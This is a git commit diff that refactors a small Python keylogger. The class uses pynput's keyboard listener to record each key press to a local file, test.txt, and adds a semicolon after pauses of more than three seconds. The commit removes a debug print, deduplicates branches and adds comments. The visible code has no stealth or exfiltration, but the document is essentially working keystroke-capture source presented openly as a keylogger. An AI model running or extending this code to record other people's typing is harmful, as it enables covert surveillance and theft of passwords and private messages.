4ec6eb1872204affe55359eef4b8a2682b8e649e
Jogi123 <70063275+Jogi123@users.noreply.github.com>
2021-01-14 16:21:23 +0100

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -6,6 +6,7 @@ from pynput import keyboard
 
 class Keylogger:
     def __init__(self):
+        # set initial start time
         self.last_time = int(datetime.datetime.now().strftime('%S'))
         with keyboard.Listener(
                 on_press=self.on_press) as listener:
@@ -16,20 +17,17 @@ class Keylogger:
 
     def write_to_log(self, key):
         with open('test.txt', 'a') as log_file:
+            # if any key hasn't been pressed in the last three seconds, write a semicolon to the file for better outline
             now = int(datetime.datetime.now().strftime('%S'))
             diff_time = now - self.last_time
-            print(diff_time)
-            # if any key hasn't been pressed in the last three seconds, write a semicolon to the file for better outline
             if diff_time > 3:
                 log_file.write(';')
-                string_key = str(key)
-                string_key = string_key.replace("'", "")
-                log_file.write(string_key)
-            else:
-                string_key = str(key)
-                string_key = string_key.replace("'", "")
-                log_file.write(string_key)
+
+            string_key = str(key)
+            string_key = string_key.replace("'", "")
+            log_file.write(string_key)
             log_file.close()
+            # update variable which specifies the last time the file has been written to
             self.last_time = int(datetime.datetime.now().strftime('%S'))
 
 
